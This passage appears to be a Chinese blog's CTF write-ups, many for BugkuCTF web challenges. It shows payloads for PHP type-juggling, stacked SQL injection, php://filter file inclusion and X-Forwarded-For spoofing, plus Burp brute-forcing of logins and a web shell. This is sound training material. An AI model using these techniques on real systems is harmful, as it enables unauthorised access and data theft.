<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414211642975.png" alt="image-20200414211642975"></p>
<p>F12查看，发现maxlength限制长度1</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/ca7bdff30672b9b087f28cc4762e102dfbe34616/image-20200414211503349.png" alt="image-20200414211503349"></p>
<p>更改长度，输入大于1778的数</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414211711691.png" alt="image-20200414211711691"></p>
<p>进行验证</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414211718742.png" alt="image-20200414211718742"></p>
<h4 id="绕过第一个if判断"><a href="#绕过第一个if判断" class="headerlink" title="绕过第一个if判断"></a>绕过第一个if判断</h4><p>查看代码，发现第二个if必须是输入的数字是1才能执行echo输出flag</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414211858576.png" alt="image-20200414211858576"></p>
<p>输入?num=1，页面没有响应</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414211922567.png" alt="image-20200414211922567"></p>
<p>发现第一个if是!is_numeric，所以输入带上字符的1，比如1”等等</p>
<p>这样就成功返回</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414212023379.png" alt="image-20200414212023379"></p>
<p>解释：因为输入1”第一个if判断不是数字，不执行echo $num，代码向下走，在进行if判断，这里的if判断1”在程序运行时这里的判断不管1后面有没有字符都会当做1来执行，所以成功输出flag</p>
<h4 id="正则匹配"><a href="#正则匹配" class="headerlink" title="正则匹配"></a>正则匹配</h4><p>payloa：?key=keykeykeykeykeykeykey:///keyx”:i</p>
<p>查看代码</p>
<p>发现正则，然后进行匹配</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414212253676.png" alt="image-20200414212253676"></p>
<p>/key                        代表一个key</p>
<p>.*                            代表一个或多个</p>
<p>.                              代表一个</p>
<p>{4,7}                       代表最少4个最多起个</p>
<p>key                         一个</p>
<p>/./                        转义中间的.代表一个///</p>
<p>.*key                      一个或者多个</p>
<p>[a-z]                       a-z中任意一个字母</p>
<p>[[:punct:]]             任意一个英文字符</p>
<p>/i                             一个i</p>
<p>得出结果输入，成功返回</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414212821929.png" alt="image-20200414212821929"></p>
<h4 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h4><p>Payload：?number1[]=1&amp;number2[]=2</p>
<p>查看代码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414213304545.png" alt="image-20200414213304545"></p>
<p>进行分析代码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/V4F8M65%7D%7B%7D%7DAW%60MZI1%7BML0L.png" alt="img"></p>
<p>需要让第一个判断错误，然后进行下一个判断，md5不能加密数组，所以这里要传一个空数组</p>
<p>输入上面的Payload，成功返回</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414213758327.png" alt="image-20200414213758327"></p>
<h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><p>查看原页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200512140146112.png" alt="image-20200512140146112"></p>
<p>在POST框输入1查看返回什么内容</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200512140315871.png" alt="image-20200512140315871"></p>
<p>使用show database查看所有数据库</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200512140744730.png" alt="image-20200512140744730"></p>
<p>查看一下表试一下，返回了，Flag表，发现存在堆叠注入</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200512140828405.png" alt="image-20200512140828405"></p>
<p>查看PHP代码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200512141555352.png" alt="image-20200512141555352"></p>
<p>可以看到上面的提交语句是这样的这是一种非预期解的方法:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$sql &#x3D; &quot;select &quot;.$post[‘query‘].&quot;||flag from Flag&quot;;</span><br></pre></td></tr></table></figure>

<p>当我们输入1后进行拼接后的语句就是这样的了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select *,1||flag from Flag</span><br></pre></td></tr></table></figure>

<p>预期解通过堆叠注入将sql_mode的值设置为PIPES_AS_CONCAT，从而将 || 视为字符串的连接操作符而非或运算符。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload：query&#x3D;1;set sql_mode&#x3D;PIPES_AS_CONCAT;select 1</span><br></pre></td></tr></table></figure>

<p>将||或运算变成连接符后就得到了一下内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select *,1,flag from Flag&quot;;</span><br></pre></td></tr></table></figure>

<h4 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h4><p>查看原页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200522105117391.png" alt="image-20200522105117391"></p>
<p>使用admin和admin尝试进行登录。</p>
<p>返回错误，说用户名和密码不存在。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200522105325431.png" alt="image-20200522105325431"></p>
<p>这样一个一个的尝试效率太慢了，我们使用burpsuit进行抓包</p>
<p>先随机输入密码，进行抓包</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200522105627840.png" alt="image-20200522105627840"></p>
<p>将信息发送到intruder模块进行clear$，然后选中password中的值将其Add$</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200522105936280.png" alt="image-20200522105936280"></p>
<p>进入Payload子模块，进行载入字典爆破。</p>
<p>查看字典中的弱口令</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200522110046142.png" alt="image-20200522110046142"></p>
<p>在Plyload Options [Simple list]中的load…选中password字典</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200522110202979.png" alt="image-20200522110202979"></p>
<p>进行Start attack发动攻击</p>
<p>得出密码是123456</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200522110311453.png" alt="image-20200522110311453"></p>
<p>在页面中输入这个密码，查看是否能够登陆成功</p>
<p>登陆成功。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200522110356569.png" alt="image-20200522110356569"></p>
<h4 id="暴力破解验证码绕过"><a href="#暴力破解验证码绕过" class="headerlink" title="暴力破解验证码绕过"></a>暴力破解验证码绕过</h4><p>原页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200522110910188.png" alt="image-20200522110910188"></p>
<p>进行一次登陆试试上面已经知道密码是123456了所以我们现在假装不知道进行绕过</p>
<p>这里我们输入的是admin，admin</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200522110953883.png" alt="image-20200522110953883"></p>
<p>我们进行抓包，将包发送到Repeater模块进行尝试登陆</p>
<p>点击Go，得到源码，然后右键选中browser，复制网页地址。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200522111258822.png" alt="image-20200522111258822"></p>
<p>Copy之后在网页打开试试</p>
<p>显示登陆失败，验证码也变化了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200522111439333.png" alt="image-20200522111439333"></p>
<p>我们将Repeater中得包信息发送到Intruder模块</p>
<p>将验证码改为当前页面的正确验证码，将字典中的弱口令导入，发动攻击</p>
<p>得出密码：123456</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200522112112995.png" alt="image-20200522112112995"></p>
<p>在页面中使用改密码登录</p>
<p>登陆成功</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200522112156596.png" alt="image-20200522112156596"></p>
<h4 id="绕过前端验证暴力破解"><a href="#绕过前端验证暴力破解" class="headerlink" title="绕过前端验证暴力破解"></a>绕过前端验证暴力破解</h4><p>还是使用admin和123登录，然后进行抓包，使用弱口令进行爆破</p>
<p>得出123456密码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200522135328846.png" alt="image-20200522135328846"></p>
<p>如果我们将抓包里面的验证码更改一下试试</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200522135409179.png" alt="image-20200522135409179"></p>
<p>进行发动攻击，还是出来了，说明验证码只是进行了前端验证</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200522135431754.png" alt="image-20200522135431754"></p>
<p>在页面中使用密码登录或者在burp中复制然后打开</p>
<p>登陆成功</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200522135839104.png" alt="image-20200522135839104"></p>
<h3 id="BugkuCTF"><a href="#BugkuCTF" class="headerlink" title="BugkuCTF"></a>BugkuCTF</h3><h4 id="WEB-2"><a href="#WEB-2" class="headerlink" title="WEB 2"></a>WEB 2</h4><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525212712340.png" alt="image-20200525212712340"></p>
<p>打开地址查看页面</p>
<p>页面只有表情，没有任何东西</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525212754995.png" alt="image-20200525212754995"></p>
<p>按F12查看一下源代码</p>
<p>发现源代码将flag注释了，我们复制提交就可以。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525212841039.png" alt="image-20200525212841039"></p>
<h4 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525212936523.png" alt="image-20200525212936523"></p>
<p>原页面，发现有公式输入框，按照将加法的结果写进去试试</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525212952887.png" alt="image-20200525212952887"></p>
<p>74+14=88，发现只能输入一个数字，说明进行了字符长度限制</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525213101428.png" alt="image-20200525213101428"></p>
<p>F12查看代码，可以看到这里做了字符长度限制，只能输入一个字符。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525213152555.png" alt="image-20200525213152555"></p>
<p>将1改为多位数，再次输入正确数值88</p>
<p>成功显示flag，复制提交就可以。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525213255863.png" alt="image-20200525213255863"></p>
<h2 id="web基础-GET"><a href="#web基础-GET" class="headerlink" title="web基础$_GET"></a>web基础$_GET</h2><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525214312273.png" alt="image-20200525214312273"></p>
<p>打开网址，查看页面</p>
<p>可以看到GET输入，当$what=flag输出flag</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525214423931.png" alt="image-20200525214423931"></p>
<p>我们在URL中输入flag，复制提交就可以。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525214724268.png" alt="image-20200525214724268"></p>
<h4 id="web基础-POST"><a href="#web基础-POST" class="headerlink" title="web基础$_POST"></a>web基础$_POST</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525220028996.png" alt="image-20200525220028996"></p>
<p>查看页面，可以看到是Post提交，提交方式和Get一样</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525221924026.png" alt="image-20200525221924026"></p>
<p>在POST中提交</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525222017722.png" alt="image-20200525222017722"></p>
<h4 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h4><p>打开网页</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525222601214.png" alt="image-20200525222601214"></p>
<p>查看页面</p>
<p>可以看到只要是不是数字，而且等于1就可以</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525222621231.png" alt="image-20200525222621231"></p>
<p>这里不管1后面加什么都以，但不能在1的前面加。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525223421384.png" alt="image-20200525223421384"></p>
<h4 id="WEB-3"><a href="#WEB-3" class="headerlink" title="WEB 3"></a>WEB 3</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525223849175.png" alt="image-20200525223849175"></p>
<p>查看页面，发现一直返回这两个弹框</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525223928618.png" alt="image-20200525223928618"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525223935748.png" alt="image-20200525223935748"></p>
<p>按F12 查看源码</p>
<p>发现一串HTML代码，复制进行解码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525225228761.png" alt="image-20200525225228761"></p>
<p>解码之后得到Key值，复制直接提交</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525225258621.png" alt="image-20200525225258621"></p>
<h4 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h4><p>这里就是要配置host配置文件，将flag.baidu.com 解析到123.206.87.240然后在网页中访问</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525225744153.png" alt="image-20200525225744153"></p>
<p>修改hosts文件，路径为<code>C:\Windows\System32\drivers\etc\hosts</code>最底下添加：120.24.86.145     flag.bugku.com  保存 访问即可</p>
<p>在页面中打开</p>
<p>成功获取key值</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525231435886.png" alt="image-20200525231435886"></p>
<p>还有一种方法就是使用burp抓包添加HOST请求</p>
<p>直接复制提交就ok，这两种方法都可以。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200525231559549.png" alt="image-20200525231559549"></p>
<h4 id="你必须让他停下"><a href="#你必须让他停下" class="headerlink" title="你必须让他停下"></a>你必须让他停下</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526075950924.png" alt="image-20200526075950924">查看</p>
<p>查看原始页面。这是我已经刷新好几次抓到的，刚进去可能没有图片，页面会一直刷新</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526080029978.png" alt="image-20200526080029978"></p>
<p>因为一直刷新所以源码也跟着刷新，根本没机会，所以就可以使用burp进行抓包。</p>
<p>让页面随机运行一次然后抓包。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526080213462.png" alt="image-20200526080213462"></p>
<p>抓完包发送到Repeater模块中，点击Go一直点击，直到出来flag值</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526080417167.png" alt="image-20200526080417167"></p>
<p>或者按F12，然后将burp放旁边只要一出现flag立马打开Intercept is on进行抓包，让页面停止运行，这一种看你反应。</p>
<p>复制flag提交就可以</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526080550190.png" alt="image-20200526080550190"></p>
<h4 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607192157745.png" alt="image-20200607192157745"></p>
<p>查看源码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607192302988.png" alt="image-20200607192302988"></p>
<p>有好几种方法</p>
<p>在POST区域：<code>f=php://filter/convert.base64-encode/resource=flag.php</code></p>
<p>php://filter/convert.base64-encode/rescoure=flag.php</p>
<p>会获得base64的加密内容，复制进行解密就可以</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607192441288.png" alt="image-20200607192441288"></p>
<p>还有一种方法直接将flag.php文件读入变量hello中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?hello&#x3D;get_file_contents(&#39;flag.php&#39;) </span><br><span class="line">?hello&#x3D;file(&#39;flag.php&#39;)</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607192631186.png" alt="image-20200607192631186"></p>
<h4 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526084005998.png" alt="image-20200526084005998"></p>
<p>打开页面得到以下代码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526084032873.png" alt="image-20200526084032873"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag In the variable ! &lt;?php  </span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;flag1.php&quot;;</span><br><span class="line">highlight_file(__file__);</span><br><span class="line">if(isset($_GET[&#39;args&#39;]))&#123;</span><br><span class="line">    $args &#x3D; $_GET[&#39;args&#39;];</span><br><span class="line">    if(!preg_match(&quot;&#x2F;^\w+$&#x2F;&quot;,$args))		&#x2F;&#x2F;  &#x2F;^开始, \w表示任意一个单词字符，即[a-zA-Z0-9_] ,+将前面的字符匹配一次或多次，$&#x2F;结尾</span><br><span class="line">    &#123;		</span><br><span class="line">        die(&quot;args error!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    eval(&quot;var_dump($$args);&quot;);		&#x2F;&#x2F;var_dump() 函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>代码审计，这里需要知道一个知识点<code>可变变量</code></p>
<p>可变变量是一种独特的变量，它允许动态改变一个变量名称。其原理是变量的名称由另外一个变量的值来确定，即一个可变变量获取了一个普通变量的值作为这个可变变量的变量名，实现过程是在变量前面多加美元符号 “$”</p>
<p>我们的目标是得到flag，由于代码含有正则匹配，文件上传、本地包含等漏洞不能用，而PHP中$GLOBALS[index] 的数组中存储了所有全局变量</p>
<p>复制提交</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526083941332.png" alt="image-20200526083941332"></p>
<h4 id="web-5"><a href="#web-5" class="headerlink" title="web 5"></a>web 5</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526085709523.png" alt="image-20200526085709523"></p>
<p>原始页面，随便提交以下数字试试，发现不行</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526085758424.png" alt="image-20200526085758424"></p>
<p>查看一下源码，发现有一大堆这种JSFUCK代码，</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526085828992.png" alt="image-20200526085828992"></p>
<p>复制这些代码，放到控制台中执行，不要忘记复制上去按回车</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526090504610.png" alt="image-20200526090504610"></p>
<p>记住字母要大写，这里给你显示的小写字母，要将字母转换为大写，在你打开前输入flag的地方已经提示了，字母要大写</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526090605804.png" alt="image-20200526090605804"></p>
<p>返回正常，说明正确，复制这个大写字母的flag在BugkuCFT提交</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526090750250.png" alt="image-20200526090750250"></p>
<h4 id="头等舱"><a href="#头等舱" class="headerlink" title="头等舱"></a>头等舱</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526091427466.png" alt="image-20200526091427466"></p>
<p>原始页面，发现真的是什么也没有</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526091547653.png" alt="image-20200526091547653"></p>
<p>使用burp抓一下包试试，发送到Repeater，发现flag在请求头中，复制提交。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526091710745.png" alt="image-20200526091710745"></p>
<h4 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h4><p>打开页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526092405600.png" alt="image-20200526092405600"></p>
<p>原始页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526092432701.png" alt="image-20200526092432701"></p>
<p>进去之后没什么特别的提示</p>
<p>但题目说了 实战 经常遇到 </p>
<p>所以 直接 御剑 跑一下</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526092618994.png" alt="image-20200526092618994"></p>
<p>点击上面的shell.php，会进入一个后台界面，让我们输入密码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526092646058.png" alt="image-20200526092646058"></p>
<p>可是我们并不知道密码是多少，所以使用暴力破解，如果一个一个的去试太麻烦了，而且想到的数量太少了，所以使用burp进行抓包。</p>
<p>现在输入框中随机输入内容，这里我输入的是123，然后打开burp点击网页的登录，进行抓包，不要忘记将Intercept is on打开</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526092921318.png" alt="image-20200526092921318"></p>
<p>右键，将其发送到intruder模块</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526092943621.png" alt="image-20200526092943621"></p>
<p>现将123 Clear$掉，然后选中123再Add$一下</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526093025865.png" alt="image-20200526093025865"></p>
<p>单击Payloads子模块</p>
<p>选中burp自带的字典，Add from list…选中Passwords，点击Start attack，进行爆破密码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526093244488.png" alt="image-20200526093244488"></p>
<p>爆破完成后，可以看到密码是hack</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526093359014.png" alt="image-20200526093359014"></p>
<p>在页面提交hack，成功返回flag，复制flag提交</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526093420784.png" alt="image-20200526093420784"></p>
<h4 id="管理员系统"><a href="#管理员系统" class="headerlink" title="管理员系统"></a>管理员系统</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526095051329.png" alt="image-20200526095051329"></p>
<p>原始页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526095115923.png" alt="image-20200526095115923"></p>
<p>查看源代码，可以看到有一个base64加密的密文，解密之后得到test123</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526095133950.png" alt="image-20200526095133950"></p>
<p>因为i管理员系统，账号肯定是admin，密码已经解密出来了是test123</p>
<p>输入提交，发现并没有返回对应的flag，而是说IP禁止访问，请联系<strong>本地</strong>管理员登录，IP被记录，这说明需要<strong>伪造本地IP</strong>进行访问</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526095240198.png" alt="image-20200526095240198"></p>
<p>先输入账号密码，，然后使用burp抓包发送到Repeater模块</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526095410043.png" alt="image-20200526095410043"></p>
<p>加入<code>X-Forwarded-For:127.0.0.1</code>伪造IP，点击GO成功返回flag，复制提交即可</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526095817142.png" alt="image-20200526095817142"></p>
<h4 id="WEB-4"><a href="#WEB-4" class="headerlink" title="WEB 4"></a>WEB 4</h4><p>打开网址，</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526100105719.png" alt="image-20200526100105719"></p>
<p>题目提醒了要查看源代码，可以看到好多URL编码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526100138637.png" alt="image-20200526100138637"></p>
<p>先复制p1 和 p2的url，将没用的删去</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526100343484.png" alt="image-20200526100343484"></p>
<p>这里可以看到unescape中的url编码在p1和p2之间，所以将他里面的url放中间，先将p1，p2分隔开防止弄乱，再加入unescape中的url，这里面的单引号全都要删除，还有分号什么的，只要与url编码无关的全都删除</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526100545399.png" alt="image-20200526100545399"></p>
<p>将多余的空格删除，然后进行解码得到flag，提交，提交时候要加上flag{}将值放到花括号中</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526100735818.png" alt="image-20200526100735818"></p>
<h4 id="flag在index里"><a href="#flag在index里" class="headerlink" title="flag在index里"></a>flag在index里</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526104118080.png" alt="image-20200526104118080"></p>
<p>查看原始页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526104928268.png" alt="image-20200526104928268"></p>
<p>点进click me？no看看，可以看到 test5是show.php中的信息，结合题目给的信息说flag在index中也就是index.php中</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526104959071.png" alt="image-20200526104959071"></p>
<p>构造任意读取文件的payload：<code>php://filter/read=convert.base64-encode/resource=index.php</code>。</p>
<p>后面还有很多，复制进行base64解码，将没用的删除</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526105646487.png" alt="image-20200526105646487"></p>
<p><code>php://filter</code>使我们常用的一种伪协议在任意文件读取，甚至getshell的时候都有利用的机会。这里就是用的任意读取文件</p>
<p><code>read=&lt;读链的筛选列表&gt;</code>           该参数可选。可以设定一个或多个过滤器名称</p>
<p>这里读的过滤器为<code>convert.base64-encode</code>，就和字面上的意思一样，把输入流<code>base64-encode</code>。<br><code>resource=index.php</code>，代表读取index.php的内容</p>
<p>关于<code>convert.*</code>过滤器，可以访问一下网址有详细讲解</p>
<p><a href="https://www.php.net/manual/zh/filters.convert.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/filters.convert.php</a></p>
<p>这个刚才页面显示的base64加密的密文</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PGh0bWw+DQogICAgPHRpdGxlPkJ1Z2t1LWN0ZjwvdGl0bGU+DQogICAgDQo8P3BocA0KCWVycm9yX3JlcG9ydGluZygwKTsNCglpZighJF9HRVRbZmlsZV0pe2VjaG8gJzxhIGhyZWY9Ii4vaW5kZXgucGhwP2ZpbGU9c2hvdy5waHAiPmNsaWNrIG1lPyBubzwvYT4nO30NCgkkZmlsZT0kX0dFVFsnZmlsZSddOw0KCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpew0KCQllY2hvICJPaCBubyEiOw0KCQlleGl0KCk7DQoJfQ0KCWluY2x1ZGUoJGZpbGUpOyANCi8vZmxhZzpmbGFne2VkdWxjbmlfZWxpZl9sYWNvbF9zaV9zaWh0fQ0KPz4NCjwvaHRtbD4NCg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>

<p>我们将其解密得到以下内容，可以看到flag就在其中，复制提交即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;Bugku-ctf&lt;&#x2F;title&gt;</span><br><span class="line">    </span><br><span class="line">&lt;?php</span><br><span class="line">	error_reporting(0);</span><br><span class="line">	if(!$_GET[file])&#123;echo &#39;&lt;a href&#x3D;&quot;.&#x2F;index.php?file&#x3D;show.php&quot;&gt;click me? no&lt;&#x2F;a&gt;&#39;;&#125;</span><br><span class="line">	$file&#x3D;$_GET[&#39;file&#39;];</span><br><span class="line">	if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">		echo &quot;Oh no!&quot;;</span><br><span class="line">		exit();</span><br><span class="line">	&#125;</span><br><span class="line">	include($file); </span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">&#x2F;&#x2F;flag:flag&#123;edulcni_elif_lacol_si_siht&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<h4 id="输入密码查看flag"><a href="#输入密码查看flag" class="headerlink" title="输入密码查看flag"></a>输入密码查看flag</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526132744362.png" alt="image-20200526132744362"></p>
<p>查看原始页面，可以看到底下说输入5位数密码查看</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526134606784.png" alt="image-20200526134606784"></p>
<p>因为是输入密码的，我们直接来爆破试试，先试用burp抓包，发送的Intruder模块进行爆破</p>
<p>先Clear$在Add$然后选中Payload子模块进行输入爆破数据</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526134751450.png" alt="image-20200526134751450"></p>
<p>将Payload type改为Number类型，因为是5位数所以从10000开始，先到20000看看能否爆破出来</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526134847802.png" alt="image-20200526134847802"></p>
<p>点击start attack进行攻击，发现成功爆破。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526135012691.png" alt="image-20200526135012691"></p>
<p>将密码输入，然后返回了flag，进行提交就可以</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200526135042949.png" alt="image-20200526135042949"></p>
<h4 id="点击一百万次"><a href="#点击一百万次" class="headerlink" title="点击一百万次"></a>点击一百万次</h4><p>打开网址</p>
